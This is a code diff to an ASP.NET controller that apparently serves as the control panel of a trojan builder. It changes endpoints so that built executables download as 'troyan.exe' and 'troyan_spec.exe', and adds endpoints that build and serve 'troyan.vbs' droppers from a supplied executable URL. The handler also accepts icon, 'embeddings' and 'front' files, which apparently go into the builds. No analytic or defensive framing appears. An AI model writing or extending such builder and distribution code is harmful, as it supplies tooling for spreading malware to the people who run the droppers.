@@ -95,7 +95,7 @@ public class CpController : Controller
                 return NotFound();
             var fileBytes = System.IO.File.ReadAllBytes(_serverService.GetExe(server));
             Response.Headers.Add("Content-Type", "application/octet-stream");
-            return File(fileBytes, "application/octet-stream");
+            return File(fileBytes, "application/octet-stream", "troyan.exe");
         }
         catch (Exception)
         {
@@ -112,17 +112,60 @@ public class CpController : Controller
             if (!System.IO.File.Exists(_serverService.GetExe(server))) 
                 return NotFound();
             var fileBytes = System.IO.File.ReadAllBytes(_serverService.BuildExe(server, exeUrl));
-            Response.Headers.Add("Content-Type", "image/x-icon");
-            return File(fileBytes, "image/x-icon");
+            Response.Headers.Add("Content-Type", "application/octet-stream");
+            return File(fileBytes, "application/octet-stream", "troyan_spec.exe");
         }
         catch (Exception)
         {
             return StatusCode(500, "Internal server error");
         }
     }
+    
+        
+    [HttpGet("{server}/GetVbs")]
+    public IActionResult GetVbs(string server)
+    {
+        try
+        {
+            server = Server(server);
+            if (!System.IO.File.Exists(_serverService.GetVbs(server)))
+                return NotFound();
+            var fileBytes = System.IO.File.ReadAllBytes(_serverService.GetVbs(server));
+            Response.Headers.Add("Content-Type", "text/vbscript");
+            return File(fileBytes, "application/octet-stream", "troyan.vbs");
+        }
+        catch (Exception)
+        {
+            return StatusCode(500, "Internal server error");
+        }
+    }
+    
+    [HttpGet("{server}/BuildVbs")]
+    public IActionResult BuildVbs(string server, string exeUrl)
+    {
+        try
+        {
+            server = Server(server);
+            if (!System.IO.File.Exists(_serverService.GetVbs(server))) 
+                return NotFound();
+            var fileBytes = System.IO.File.ReadAllBytes(_serverService.BuildExe(server, exeUrl));
+            Response.Headers.Add("Content-Type", "application/octet-stream");
+            return File(fileBytes, "application/octet-stream", "troyan_spec.vbs");
+        }
+        catch (Exception)
+        {
+            return StatusCode(500, "Internal server error");
+        }
+    }
+    
+    [HttpPost()]
+    public IActionResult Index(ServerModel updatedModel, string action, IFormFile iconFile, List<IFormFile> newEmbeddings, List<IFormFile> newFront)
+    {
+        return IndexWithServer(updatedModel, action, iconFile, newEmbeddings, newFront);
+    }
 
     [HttpPost("{server}", Name = "Index")]
-    public IActionResult Index(ServerModel updatedModel, string action, IFormFile iconFile, List<IFormFile> newEmbeddings, List<IFormFile> newFront)
+    public IActionResult IndexWithServer(ServerModel updatedModel, string action, IFormFile iconFile, List<IFormFile> newEmbeddings, List<IFormFile> newFront)
     {
         if (updatedModel.AdminServers != null)
         {
@@ -213,11 +256,11 @@ public class CpController : Controller
             var result = _serverService.PostServer(existingModel.Server, existingModel, action);
 
             existingModel.Result = result;
-            return View(existingModel);
+            return View("Index", existingModel);
         }
         catch (Exception e)
         {
-            return View(new ServerModel() {Server = updatedModel.Server, Result = e.Message + "\r\n" + e.StackTrace });
+            return View("Index", new ServerModel() {Server = updatedModel.Server, Result = e.Message + "\r\n" + e.StackTrace });
         }
     }
     
